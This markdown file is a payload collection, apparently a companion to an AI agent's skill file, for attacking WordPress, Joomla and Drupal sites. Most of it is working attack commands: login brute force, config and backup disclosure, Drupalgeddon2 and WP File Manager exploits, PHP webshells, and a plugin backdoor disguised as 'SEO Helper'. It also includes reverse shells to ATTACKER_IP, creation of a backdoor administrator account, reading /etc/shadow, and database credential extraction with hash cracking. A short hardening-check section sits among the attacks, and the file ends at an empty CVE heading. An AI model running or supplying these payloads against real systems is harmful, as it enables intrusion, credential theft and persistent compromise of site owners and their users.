# CMS Framework Attack Payloads -- Complete Attack Payload Collection

> This file is a companion to `SKILL.md`, containing all CMS attack payloads organized by category.

---

## 1. CMS Fingerprinting and Identification

Identify the CMS platform, version, and technology stack before targeted scanning.

### WhatWeb -- Technology Fingerprinting

```bash
# Basic fingerprint
whatweb http://target

# Verbose output with all details
whatweb -v http://target

# Aggressive scanning with plugins
whatweb -a 3 http://target

# Scan multiple targets
whatweb -i targets.txt -o results.txt

# Follow redirects and use custom user agent
whatweb -v --user-agent "Mozilla/5.0" http://target
```

### CMSeeK -- Deep CMS Identification

```bash
# Basic CMS detection
cmseek -u http://target

# Follow redirects
cmseek -u http://target --follow-redirect

# Scan with custom user agent
cmseek -u http://target --user-agent "Mozilla/5.0"

# Batch scan from file
cmseek -l target_list.txt

# Specify CMS to test (if known)
cmseek -u http://target --wordpress
cmseek -u http://target --joomla
cmseek -u http://target --drupal
```

### Manual CMS Detection via HTTP Probes

```bash
# WordPress indicators
curl -s http://target/wp-login.php | head -5
curl -s http://target/wp-content/ | head -5
curl -s http://target/wp-includes/ | head -5
curl -s http://target/readme.html | grep "WordPress"
curl -s http://target/feed/ | grep "wordpress"
curl -s http://target/?p=1 | grep -i "wp-"
curl -sI http://target | grep -i "x-powered-by\|x-pingback\|link:"

# Joomla indicators
curl -s http://target/administrator/ | grep -i "joomla"
curl -s http://target/language/en-GB/en-GB.ini | head -5
curl -s http://target/README.txt | grep -i "joomla"
curl -s http://target/joomla.xml | head -10
curl -sI http://target | grep -i "joomla"

# Drupal indicators
curl -s http://target/CHANGELOG.txt | head -5
curl -s http://target/core/CHANGELOG.txt | head -5
curl -s http://target/misc/drupal.js | head -5
curl -s http://target/sites/default/settings.php > /dev/null 2>&1 && echo "Drupal detected"
curl -s http://target/Drupal.theme | head -5
curl -s http://target/misc/favicon.ico | file -
```

---

## 2. WordPress Enumeration and Attack

### WPScan -- Full Enumeration

```bash
# Complete WordPress scan with all enumerations
wpscan --url http://target --enumerate u,vp,vt,dbe,cb --api-token YOUR_API_TOKEN

# Enumerate users only
wpscan --url http://target --enumerate u

# Enumerate vulnerable plugins
wpscan --url http://target --enumerate vp --api-token YOUR_API_TOKEN

# Enumerate vulnerable themes
wpscan --url http://target --enumerate vt --api-token YOUR_API_TOKEN

# Enumerate all plugins (including non-vulnerable)
wpscan --url http://target --enumerate ap

# Enumerate database exports
wpscan --url http://target --enumerate dbe

# Enumerate config backups
wpscan --url http://target --enumerate cb

# Stealthy scan with random user agent and throttling
wpscan --url http://target --random-user-agent --throttle 500 --enumerate u,vp,vt

# Disable TLS certificate checks
wpscan --url http://target --disable-tls-checks --enumerate u,vp,vt

# Force scan even if CMS not detected
wpscan --url http://target --force --enumerate u,vp,vt

# Password brute force with discovered users
wpscan --url http://target --passwords /usr/share/wordlists/rockyou.txt --usernames admin,editor
```

### WordPress User Enumeration (Manual)

```bash
# Method 1: Author archives (enumerate user IDs)
for i in $(seq 1 20); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://target/?author=$i")
  if [ "$STATUS" = "200" ]; then
    curl -s "http://target/?author=$i" | grep -oP 'author/[^/]+/' | head -1
  fi
done

# Method 2: REST API enumeration
curl -s http://target/wp-json/wp/v2/users | jq '.[].slug'
curl -s http://target/wp-json/wp/v2/users?per_page=100 | jq '.[] | {id, slug, name, roles}'

# Method 3: RSS/Atom feed
curl -s http://target/feed/ | grep -oP '<dc:creator><!\[CDATA\[\K[^]]+'

# Method 4: WPScan API-based enumeration
wpscan --url http://target --enumerate u1-100
```

### WordPress XML-RPC Exploitation

```bash
# Check if XML-RPC is enabled
curl -s http://target/xmlrpc.php | head -5

# List available methods
curl -s -X POST http://target/xmlrpc.php \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# Single user brute force via XML-RPC
curl -s -X POST http://target/xmlrpc.php \
  -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>password123</string></value></param></params></methodCall>'

# Multicall brute force (amplified -- hundreds of attempts per request)
# Generate with WPScan:
wpscan --url http://target --passwords passwords.txt --usernames admin --password-attack xmlrpc-multicall

# Pingback SSRF via XML-RPC
curl -s -X POST http://target/xmlrpc.php \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://internal-server:8080/admin</string></value></param><param><value><string>http://target/?p=1</string></value></param></params></methodCall>'

# DDoS amplification via pingback (educational only)
# Multiple targets can be abused to flood a single URL
```

### WordPress Configuration Disclosure

```bash
# Common backup file names for wp-config.php
curl -s http://target/wp-config.php.bak
curl -s http://target/wp-config.php.bak.txt
curl -s http://target/wp-config.php.old
curl -s http://target/wp-config.php.save
curl -s http://target/wp-config.php.swp
curl -s http://target/wp-config.php~
curl -s http://target/wp-config.txt
curl -s http://target/wp-config.php.zip
curl -s http://target/.wp-config.php.swp
curl -s http://target/wp-config.orig
curl -s http://target/wp-config.sample

# Database export files
curl -s http://target/database.sql
curl -s http://target/db.sql
curl -s http://target/backup.sql
curl -s http://target/wp-content/backup-db/
curl -s http://target/wp-content/backups/
curl -s http://target/wp-content/uploads/backup/
curl -s http://target/wp-content/backup/

# Debug and log files
curl -s http://target/debug.log
curl -s http://target/wp-content/debug.log
curl -s http://target/error_log
curl -s http://target/wp-content/error_log

# Readme and changelog files
curl -s http://target/readme.html
curl -s http://target/wp-content/plugins/README
curl -s http://target/CHANGELOG.md
```

### WordPress Plugin Vulnerability Exploitation

```bash
# Enumerate installed plugins and versions
wpscan --url http://target --enumerate ap --api-token YOUR_API_TOKEN

# Common plugin paths to probe
for plugin in contact-form-7 woocommerce elementor yoast-seo wordfence akismet updraftplus; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://target/wp-content/plugins/$plugin/readme.txt")
  if [ "$STATUS" = "200" ]; then
    echo "[FOUND] $plugin"
    curl -s "http://target/wp-content/plugins/$plugin/readme.txt" | head -5
  fi
done

# Plugin version detection from readme.txt
curl -s "http://target/wp-content/plugins/contact-form-7/readme.txt" | head -20

# Directory listing check for plugins
curl -s http://target/wp-content/plugins/ | grep -oP 'href="[^/"]+/"'

# Common vulnerable plugin paths
curl -s http://target/wp-content/plugins/wp-file-manager/readme.txt
curl -s http://target/wp-content/plugins/duplicator/readme.txt
curl -s http://target/wp-content/plugins/shortcode-variables/readme.txt
```

### WordPress Theme Exploitation

```bash
# Enumerate themes
wpscan --url http://target --enumerate at

# Check theme files for version
curl -s "http://target/wp-content/themes/twentytwentyone/style.css" | head -10

# Directory listing for themes
curl -s http://target/wp-content/themes/ | grep -oP 'href="[^/"]+/"'

# Theme editor exploitation (requires admin access)
# Access: http://target/wp-admin/theme-editor.php
# Inject PHP code into theme header/footer files
```

### WordPress Admin Panel Attacks

```bash
# WordPress login brute force with hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:F=Invalid"

# WordPress login brute force with WPScan
wpscan --url http://target --passwords passwords.txt --usernames admin,editor,author --max-threads 5

# WordPress REST API user creation (requires admin cookie/nonce)
# After obtaining admin session:
curl -s -X POST http://target/wp-json/wp/v2/users \
  -H "Cookie: wordpress_logged_in_=SESSION_COOKIE" \
  -H "Content-Type: application/json" \
  -H "X-WP-Nonce: NONCE_VALUE" \
  -d '{"username":"backdoor","password":"Str0ngP@ss!","email":"backdoor@evil.com","roles":["administrator"]}'

# Webshell upload via theme editor (after admin access)
# POST to /wp-admin/theme-editor.php with:
# newcontent=<?php system($_GET['cmd']); ?>
# file=header.php
# action=update
# theme=current_theme
```

### WordPress wp-cron Exploitation

```bash
# Check if wp-cron is accessible
curl -s http://target/wp-cron.php

# WP-Cron jobs enumeration (requires authentication)
curl -s http://target/wp-cron.php?doing_wp_cron

# Denial of service via wp-cron (trigger repeatedly)
# while true; do curl -s http://target/wp-cron.php?doing_wp_cron > /dev/null; done
```

---

## 3. Joomla Enumeration and Attack

### JoomScan -- Comprehensive Scanning

```bash
# Basic Joomla scan
joomscan -u http://target

# Scan all components
joomscan -u http://target --scan-all

# Check specific component
joomscan -u http://target --component com_users

# Scan with custom cookie
joomscan -u http://target --cookie "session=abc123"

# Scan with proxy
joomscan -u http://target --proxy http://127.0.0.1:8080

# Scan with specific user agent
joomscan -u http://target --user-agent "Mozilla/5.0"
```

### Joomla Manual Enumeration

```bash
# Joomla version detection
curl -s http://target/language/en-GB/en-GB.ini | grep "version"
curl -s http://target/administrator/manifests/files/joomla.xml | grep version
curl -s http://target/libraries/cms/version/version.php | grep RELEASE

# Joomla component enumeration
# Common components to probe
for component in users content contact search newsfeeds weblinks media categories tags finder; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://target/index.php?option=com_$component")
  if [ "$STATUS" = "200" ]; then
    echo "[FOUND] com_$component"
  fi
done

# Joomla configuration file exposure
curl -s http://target/configuration.php
curl -s http://target/configuration.php.bak
curl -s http://target/configuration.php~
curl -s http://target/configuration.php.old
curl -s http://target/configuration.php.save
curl -s http://target/configuration.php.swp

# Joomla administrator panel
curl -s http://target/administrator/ | head -20
curl -sI http://target/administrator/ | head -10

# Joomla README files
curl -s http://target/README.txt
curl -s http://target/docs/README.txt
curl -s http://target/README.md

# Joomla directory listing
curl -s http://target/components/ | grep -oP 'href="[^/"]+/"'
curl -s http://target/modules/ | grep -oP 'href="[^/"]+/"'
curl -s http://target/plugins/ | grep -oP 'href="[^/"]+/"'
curl -s http://target/templates/ | grep -oP 'href="[^/"]+/"'
curl -s http://target/language/ | grep -oP 'href="[^/"]+/"'
```

### Joomla Admin Brute Force

```bash
# Joomla admin brute force with hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form \
  "/administrator/index.php:username=^USER^&passwd=^PASS^&task=login&option=com_login:F=Invalid"

# Joomla admin brute force with custom script
# Joomla login form uses a CSRF token -- extract it first:
CSRF_TOKEN=$(curl -s -c cookies.txt http://target/administrator/ | grep -oP 'name="[a-f0-9]+"\s+value="1"' | head -1 | grep -oP 'name="\K[^"]+')
curl -s -b cookies.txt -c cookies.txt -X POST http://target/administrator/index.php \
  -d "username=admin&passwd=password123&task=login&option=com_login&${CSRF_TOKEN}=1"

# Joomla password reset exploitation
curl -s http://target/index.php?option=com_users&view=reset
```

### Joomla Known CVE Exploitation

```bash
# CVE-2023-23752 -- Joomla unauthorized information disclosure (Joomla 4.x)
curl -s http://target/api/index.php/v1/config/application?public=true
# Returns database credentials and configuration in JSON

# CVE-2022-23752 -- Joomla SQL injection in weblinks
# Requires authenticated access

# Older Joomla RCE exploits
# CVE-2015-8562 -- Joomla HTTP Header Unserialize RCE (1.5-3.4.5)
# Inject serialized payload in User-Agent header:
python3 joomla_rce.py -t http://target -c "id"
```

### Joomla Post-Exploitation

```bash
# After admin access -- install malicious extension
# Navigate to: Extensions > Manage > Install
# Upload a crafted ZIP containing a PHP webshell

# Modify template files for persistence
# Extensions > Templates > Templates > Edit index.php
# Inject: <?php system($_GET['cmd']); ?>

# Create super user via database
# Extract credentials from configuration.php
# mysql -h DB_HOST -u DB_USER -pDB_PASSWORD DB_NAME -e "INSERT INTO jos_users ..."

# Joomla configuration extraction
curl -s http://target/configuration.php 2>/dev/null | grep -E "(public \$host|public \$user|public \$password|public \$db)"
```

---

## 4. Drupal Enumeration and Attack

### Droopescan -- Drupal Scanning

```bash
# Basic Drupal scan
droopescan scan drupal -u http://target

# Scan with multiple threads
droopescan scan drupal -u http://target -t 16

# Scan with custom user agent
droopescan scan drupal -u http://target -U "Mozilla/5.0"

# Enumerate all plugins/modules
droopescan scan drupal -u http://target -e a

# Scan multiple Drupal targets
droopescan scan drupal -U targets.txt

# Scan with proxy
droopescan scan drupal -u http://target --proxy http://127.0.0.1:8080
```

### Drupal Manual Enumeration

```bash
# Drupal version detection via CHANGELOG.txt
curl -s http://target/CHANGELOG.txt | head -5
curl -s http://target/core/CHANGELOG.txt | head -5

# Block CHANGELOG.txt detection (Drupal 8+ often blocks this)
# Try alternative version detection:
curl -s http://target/core/modules/system/system.info.yml | grep version
curl -s http://target/misc/drupal.js | head -3

# Drupal module enumeration
curl -s http://target/sites/all/modules/ | grep -oP 'href="[^/"]+/"'
curl -s http://target/core/modules/ | grep -oP 'href="[^/"]+/"'

# Drupal theme enumeration
curl -s http://target/sites/all/themes/ | grep -oP 'href="[^/"]+/"'
curl -s http://target/core/themes/ | grep -oP 'href="[^/"]+/"'

# Drupal configuration files
curl -s http://target/sites/default/settings.php
curl -s http://target/sites/default/settings.php.bak
curl -s http://target/sites/default/settings.php~
curl -s http://target/sites/default/settings.php.old

# Drupal backup files
curl -s http://target/backup.sql
curl -s http://target/backup.tar.gz
curl -s http://target/backup.zip
curl -s http://target/sites/default/files/backup/

# Drupal user enumeration
# Drupal does not expose user IDs by default, but some modules do:
curl -s http://target/user/1
curl -s http://target/user/1/edit
curl -s http://target/?q=user/1
curl -s http://target/?q=user/register

# Drupal admin panel
curl -s http://target/admin
curl -s http://target/admin/content
curl -s http://target/admin/config
curl -s http://target/admin/structure

# Drupal REST API endpoints
curl -s http://target/jsonapi
curl -s http://target/jsonapi/user/user
curl -s http://target/node?_format=hal_json
curl -s http://target/entity/node?_format=json
```

### Drupalgeddon Exploits

```bash
# Drupalgeddon2 -- CVE-2018-7600 (Drupal 7.x / 8.x RCE)
# Unauthenticated remote code execution via render array
curl -s http://target -X POST \
  -d "form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&name[#post_render][]=system&name[#type]=markup&name[#markup]=id"

# Drupalgeddon2 -- Alternative payload for command execution
curl -s http://target -X POST \
  -d "form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&name[#post_render][]=exec&name[#type]=markup&name[#markup]=id"

# Drupalgeddon2 -- Using drupalgeddon2.rb exploit script
ruby drupalgeddon2.rb http://target

# Drupalgeddon -- CVE-2014-3704 (Drupal 7.x SQL Injection)
# Exploits the expandArguments function in database API
python3 drupalgeddon.py http://target

# CVE-2019-6340 -- Drupal RESTful Web Services RCE (Drupal 8.x)
# Exploit via REST API with crafted JSON payload
curl -s -X POST http://target/node/1?_format=hal_json \
  -H "Content-Type: application/hal+json" \
  -d '{"link":[{"value":"<script>alert(1)</script>","options":"O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\" GuzzleHttp\\Psr7\\FnStream methods\";a:1:{s:5:\"close\";s:7:\"phpinfo\";}s:9:\"_fn_close\";s:7:\"phpinfo\";}"}]}'

# CVE-2018-7602 -- Drupalgeddon2 follow-up (authenticated RCE)
# Requires authenticated access but exploits similar render API vulnerability
```

### Drupal Admin Brute Force

```bash
# Drupal admin brute force with hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form \
  "/user/login:name=^USER^&pass=^PASS^&form_id=user_login&op=Log+in:F=Sorry"

# Drupal login with CSRF token extraction
CSRF=$(curl -s -c cookies.txt http://target/user/login | grep -oP 'form_build_id" value="\K[^"]+')
curl -s -b cookies.txt -c cookies.txt -X POST http://target/user/login \
  -d "name=admin&pass=password123&form_build_id=${CSRF}&form_id=user_login&op=Log+in"

# Drupal password reset attack
curl -s http://target/user/password
```

### Drupal Post-Exploitation

```bash
# After admin access -- enable PHP filter module
# Navigate to: Extend > List > Enable "PHP Filter"
# Then: Content > Add content > Article
# Switch text format to "PHP code" and inject PHP webshell

# Drupal configuration export (exposes all settings including credentials)
drush config-export
# Or via web: admin/config/development/configuration/export

# Drupal database credential extraction from settings.php
cat sites/default/settings.php | grep -A5 "'database'\|'username'\|'password'\|'host'"

# Install backdoor module
# Create a custom Drupal module with webshell in .module file
# Upload via: Extend > Install new module
```

---

## 5. Nuclei CMS Template Scanning

### Nuclei -- WordPress Templates

```bash
# Scan with all WordPress CVE templates
nuclei -u http://target -t ~/nuclei-templates/http/cves/ -tags wordpress

# Scan with WordPress-specific templates
nuclei -u http://target -t ~/nuclei-templates/http/technologies/ -tags wordpress

# WordPress exposed sensitive files
nuclei -u http://target -t ~/nuclei-templates/http/exposures/ -tags wordpress

# WordPress config and backup detection
nuclei -u http://target -t ~/nuclei-templates/http/exposures/configs/ -tags wordpress

# WordPress plugin vulnerability scan
nuclei -u http://target -t ~/nuclei-templates/http/vulnerabilities/wordpress/

# WordPress user enumeration template
nuclei -u http://target -t ~/nuclei-templates/http/technologies/wordpress/ -tags user-enum
```

### Nuclei -- Joomla Templates

```bash
# Scan with all Joomla CVE templates
nuclei -u http://target -t ~/nuclei-templates/http/cves/ -tags joomla

# Joomla exposed files and configuration
nuclei -u http://target -t ~/nuclei-templates/http/exposures/ -tags joomla

# Joomla component vulnerabilities
nuclei -u http://target -t ~/nuclei-templates/http/vulnerabilities/joomla/

# Joomla detection and fingerprinting
nuclei -u http://target -t ~/nuclei-templates/http/technologies/ -tags joomla
```

### Nuclei -- Drupal Templates

```bash
# Scan with all Drupal CVE templates
nuclei -u http://target -t ~/nuclei-templates/http/cves/ -tags drupal

# Drupal specific vulnerability scan
nuclei -u http://target -t ~/nuclei-templates/http/vulnerabilities/drupal/

# Drupal configuration and backup detection
nuclei -u http://target -t ~/nuclei-templates/http/exposures/ -tags drupal

# Drupal Drupalgeddon exploitation templates
nuclei -u http://target -t ~/nuclei-templates/http/cves/ -tags drupalgeddon
```

### Nuclei -- General CMS Scanning

```bash
# Scan all CMS-related templates
nuclei -u http://target -t ~/nuclei-templates/http/ -tags cms

# Full CVE scan for any web application
nuclei -u http://target -t ~/nuclei-templates/http/cves/

# Exposed panels and admin interfaces
nuclei -u http://target -t ~/nuclei-templates/http/exposures/ -tags panel,admin

# Backup and config file detection
nuclei -u http://target -t ~/nuclei-templates/http/exposures/configs/

# Rate-limited scanning for stealth
nuclei -u http://target -t ~/nuclei-templates/http/cves/ -tags wordpress -rl 50 -c 25 -bs 25

# Output results to file
nuclei -u http://target -t ~/nuclei-templates/http/cves/ -tags cms -o results.txt -json
```

---

## 6. Nikto -- CMS and Server Scanning

```bash
# Basic Nikto scan
nikto -h http://target

# Scan specific CMS paths
nikto -h http://target -C all

# Nikto with proxy (through Burp Suite)
nikto -h http://target -useproxy http://127.0.0.1:8080

# Nikto WordPress-specific checks
nikto -h http://target -Tuning 1234567890 | grep -i "wp-\|wordpress"

# Nikto with output to file
nikto -h http://target -o nikto_results.html -Format html

# Nikto scan specific port
nikto -h http://target:8080

# Nikto with authentication
nikto -h http://target -id admin:password

# Nikto tuning options
# -Tuning 1 - Interesting files
# -Tuning 2 - Misconfiguration
# -Tuning 3 - Information disclosure
# -Tuning 4 - XSS/Injection
# -Tuning 5 - Remote file retrieval
# -Tuning 6 - Denial of service
# -Tuning 7 - Remote file retrieval (server)
# -Tuning 8 - Command execution
# -Tuning 9 - SQL injection
# -Tuning 0 - File upload
nikto -h http://target -Tuning 1234589
```

---

## 7. CMS Webshell Upload and Persistence

### WordPress Webshell Techniques

```bash
# Method 1: Theme file editing (requires admin)
# POST /wp-admin/theme-editor.php
# Inject into header.php or 404.php:
# <?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);} ?>

# Method 2: Plugin upload
# Create a malicious plugin ZIP:
mkdir evil-plugin && cd evil-plugin
cat > evil-plugin.php << 'EOF'
<?php
/*
Plugin Name: SEO Helper
Description: Advanced SEO optimization helper
Version: 1.0
*/
if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}
?>
EOF
zip -r ../evil-plugin.zip .
# Upload via: Plugins > Add New > Upload Plugin

# Method 3: Media upload with MIME type bypass
# Rename webshell: shell.php.jpg or shell.php%00.jpg (null byte)
# Intercept and modify MIME type to image/jpeg

# Method 4: Database injection of webshell
# After obtaining DB credentials:
mysql -h DB_HOST -u DB_USER -pDB_PASSWORD DB_NAME -e \
  "INSERT INTO wp_options (option_name, option_value) VALUES ('shell', '<?php system(\$_GET[\"cmd\"]); ?>');"
```

### Joomla Webshell Techniques

```bash
# Method 1: Malicious extension installation
# Create a Joomla extension ZIP with webshell in entry point file
# Upload via: Extensions > Manage > Install

# Method 2: Template file editing (requires admin)
# Extensions > Templates > Templates > Edit index.php
# Inject: <?php system($_GET['cmd']); ?>

# Method 3: Media manager upload
# Rename webshell with double extension: shell.php.jpg
# Or exploit media manager configuration to allow PHP files
```

### Drupal Webshell Techniques

```bash
# Method 1: PHP filter module (Drupal 7)
# Enable PHP filter module: Modules > Enable "PHP Filter"
# Create new content with PHP format
# Inject: <?php system($_GET['cmd']); ?>

# Method 2: Module upload
# Create custom Drupal module containing webshell
# Upload via: Extend > Install new module

# Method 3: Configuration export manipulation
# drush config-edit to inject PHP into configuration values

# Method 4: Theme twig template injection
# Modify twig template to include: {{ dump(php_function) }}
# Or exploit Drupal's render API for code execution
```

### Generic Webshell Payloads

```php
<?php // Basic PHP webshell
if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);} ?>

<?php // Alternative PHP webshell (base64 obfuscated)
eval(base64_decode($_REQUEST['e'])); ?>

<?php // PHP webshell disguised as image
exif_imagetype($_SERVER['SCRIPT_FILENAME']); ?>
<!-- <?php system($_GET['cmd']); ?> -->

<?php // PHP reverse shell via CMS
$sock=fsockopen("ATTACKER_IP",4444);
$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);
?>
```

---

## 8. CMS Database Credential Extraction

### WordPress Database Credentials

```bash
# Extract from wp-config.php (file disclosure or server access)
grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST" wp-config.php

# Common wp-config.php locations
cat /var/www/html/wp-config.php
cat /var/www/wordpress/wp-config.php
cat /srv/www/wordpress/wp-config.php
cat /home/user/public_html/wp-config.php

# Use extracted credentials to access database
mysql -h DB_HOST -u DB_USER -pDB_PASSWORD DB_NAME

# Extract WordPress password hashes
mysql -h DB_HOST -u DB_USER -pDB_PASSWORD DB_NAME -e \
  "SELECT user_login, user_pass FROM wp_users;"

# Crack WordPress password hashes with hashcat
# WordPress uses phpass (MD5 with salt)
hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Joomla Database Credentials

```bash
# Extract from configuration.php
grep -E "\$host|\$user|\$password|\$db" configuration.php

# Joomla password hash format: bcrypt ($2y$10$...)
# Extract admin hash:
mysql -h DB_HOST -u DB_USER -pDB_PASSWORD DB_NAME -e \
  "SELECT username, password FROM jos_users WHERE block=0;"

# Crack Joomla hashes
hashcat -m 3200 joomla_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Drupal Database Credentials

```bash
# Extract from settings.php
grep -E "'database'|'username'|'password'|'host'" sites/default/settings.php

# Drupal 8+ uses YAML for settings
cat sites/default/settings.php | grep -A10 "database:"

# Drupal password hash format: SHA-512 with salt (phpass portable)
# Extract hashes:
mysql -h DB_HOST -u DB_USER -pDB_PASSWORD DB_NAME -e \
  "SELECT name, pass FROM users_field_data WHERE status=1;"

# Crack Drupal hashes with hashcat
hashcat -m 7900 drupal_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 9. CMS Security Hardening Verification

### WordPress Hardening Checks

```bash
# Check if file editing is disabled
grep "DISALLOW_FILE_EDIT" wp-config.php
grep "DISALLOW_FILE_MODS" wp-config.php

# Check if WordPress version is hidden
curl -s http://target/ | grep -i "generator"

# Check if REST API is restricted
curl -s http://target/wp-json/wp/v2/users | jq .

# Check if XML-RPC is disabled
curl -s -X POST http://target/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# Check file permissions
ls -la wp-config.php       # Should be 440 or 400
ls -la wp-content/         # Should be 755
ls -la wp-content/uploads/ # Should be 755
```

### Joomla Hardening Checks

```bash
# Check if administrator panel is IP-restricted
curl -sI http://target/administrator/

# Check if version information is exposed
curl -s http://target/ | grep -i "joomla\|generator"

# Check directory listing
curl -s http://target/components/
curl -s http://target/modules/
curl -s http://target/plugins/

# Check for configuration file exposure
curl -s http://target/configuration.php
```

### Drupal Hardening Checks

```bash
# Check if CHANGELOG.txt is blocked
curl -s http://target/CHANGELOG.txt

# Check if update module is disabled (information disclosure)
curl -s http://target/admin/reports/updates

# Check if REST API is properly configured
curl -s http://target/jsonapi

# Check if user registration is disabled
curl -s http://target/user/register

# Check for trusted_host configuration
grep "trusted_host" sites/default/settings.php
```

---

## 10. WordPress Plugin Exploitation -- Specific CVEs

### 10.1 WP File Manager Plugin Exploitation

```bash
# WP File Manager (multiple CVEs) -- unauthenticated file upload
# CVE-2020-25213 -- WP File Manager 6.0-6.9
# Upload PHP webshell via the fm_admin endpoint
curl -s -X POST "http://target/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" \
  -F "reqid=1744" -F "cmd=upload" -F "target=l1_Lw" -F "mtime[]"="" \
  -F "upload[]=@shell.php"

# Verify uploaded file
curl -s "http://target/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id"
```

### 10.2 Elementor Pro and WooCommerce Exploitation

```bash
# Elementor Pro -- unauthenticated data extraction via REST API
# Check for Elementor endpoints
curl -s "http://target/wp-json/elementor/v1" | head -20
curl -s "http://target/wp-json/elementor-pro/v1" | head -20

# WooCommerce -- sensitive data exposure via REST API
curl -s "http://target/wp-json/wc/v3" | jq .
curl -s "http://target/wp-json/wc/v3/customers" | jq .
curl -s "http://target/wp-json/wc/v3/orders" | jq .

# WooCommerce -- coupon enumeration
curl -s "http://target/wp-json/wc/v3/coupons" | jq .
```

### 10.3 Duplicator Plugin Backup Extraction

```bash
# Duplicator plugin -- backup file download
# CVE-2020-11738 -- Duplicator < 1.3.28
# Check for installer files
curl -sI "http://target/installer.php" | head -5
curl -sI "http://target/wp-content/backups-dup-light/installer.php" | head -5

# Download backup archive
curl -s -o backup.zip "http://target/wp-content/backups-dup-light/backup_archive.zip"
curl -s -o backup.zip "http://target/wp-snapshots/tmp/package.zip"

# Extract WordPress files and credentials from backup
unzip backup.zip -d backup_extracted/
grep -r "DB_PASSWORD" backup_extracted/
grep -r "wp-config" backup_extracted/
```

### 10.4 Contact Form 7 and Other Common Plugins

```bash
# Contact Form 7 -- email header injection and LFI
# Test for CVE-2020-36458
curl -s "http://target/wp-json/contact-form-7/v1/contact-forms" | jq .

# WPForms -- information disclosure
curl -s "http://target/wp-json/wpforms/v1" | head -10

# Yoast SEO -- data exposure via REST API
curl -s "http://target/wp-json/yoast/v1" | head -10

# UpdraftPlus -- backup download
curl -sI "http://target/wp-content/updraft/index.html"
curl -s "http://target/wp-content/updraft/" | grep -oP 'href="[^"]+\.zip"'
```

---

## 11. Joomla Advanced Scanning and Exploitation

### 11.1 Joomla Deep Component Enumeration

```bash
# Comprehensive Joomla component enumeration with curl
for component in $(cat /usr/share/wordlists/dirb/common.txt); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://target/index.php?option=com_$component")
  if [ "$STATUS" != "404" ] && [ "$STATUS" != "500" ]; then
    echo "[FOUND:$STATUS] com_$component"
  fi
done

# Joomla vulnerable component paths
curl -s http://target/components/com_users/
curl -s http://target/components/com_media/
curl -s http://target/components/com_contact/
curl -s http://target/components/com_content/
curl -s http://target/components/com_fields/
curl -s http://target/components/com_config/
curl -s http://target/components/com_installer/

# Joomla module enumeration
curl -s http://target/modules/ | grep -oP 'href="[^/"]+/"'
curl -s http://target/plugins/ | grep -oP 'href="[^/"]+/"'
```

### 11.2 Joomla CVE-2023-23752 Deep Exploitation

```bash
# CVE-2023-23752 -- Joomla 4.x unauthorized info disclosure
# Extract full configuration including database credentials
curl -s http://target/api/index.php/v1/config/application?public=true | jq .

# Extract via alternative API endpoints
curl -s http://target/api/index.php/v1/config/application | jq .
curl -s http://target/api/index.php/v1/users | jq .

# Extract CMS configuration data
curl -s "http://target/api/index.php/v1/config/application?public=true" \
  | jq '{db: .data.attributes.db, user: .data.attributes.user, password: .data.attributes.password}'

# Verify Joomla version is vulnerable
curl -s http://target/administrator/manifests/files/joomla.xml | grep version
```

### 11.3 Joomla Template Injection and RCE

```bash
# Joomla template injection for RCE (requires admin)
# Edit template via API
curl -s -X PATCH "http://target/api/index.php/v1/templates/styles/1" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"params":{"custom_css":"body{}<?php system($_GET[\"cmd\"]); ?>"}}'

# Joomla extensions directory traversal
curl -s http://target/components/com_media/tmpl/images/
curl -s http://target/media/com_content/images/

# Joomla log file access for information disclosure
curl -s http://target/administrator/logs/
curl -s http://target/logs/error.php
```

---

## 12. Drupal Advanced Exploitation

### 12.1 Drupalgeddon2 (CVE-2018-7600) -- Advanced Payloads

```bash
# Drupalgeddon2 with reverse shell payload
curl -s http://target -X POST \
  -d "form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&name[#post_render][]=system&name[#type]=markup&name[#markup]=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"

# Drupalgeddon2 with encoded PHP payload
# PHP: file_put_contents('/tmp/shell.php', '<?php system($_GET["cmd"]); ?>')
curl -s http://target -X POST \
  -d "form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&name[#post_render][]=exec&name[#type]=markup&name[#markup]=echo+%27PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2B%27+%7C+base64+-d+>+/tmp/shell.php"

# Drupalgeddon2 using the Ruby exploit script
ruby drupalgeddon2.rb http://target -c "id; cat /etc/shadow"

# Drupalgeddon2 check if vulnerable without exploitation
curl -s http://target -X POST \
  -d "form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&name[#post_render][]=printf&name[#type]=markup&name[#markup]=VULN_CHECK_$(date +%s)"
```

### 12.2 CVE-2019-6340 -- Drupal REST API RCE

```bash
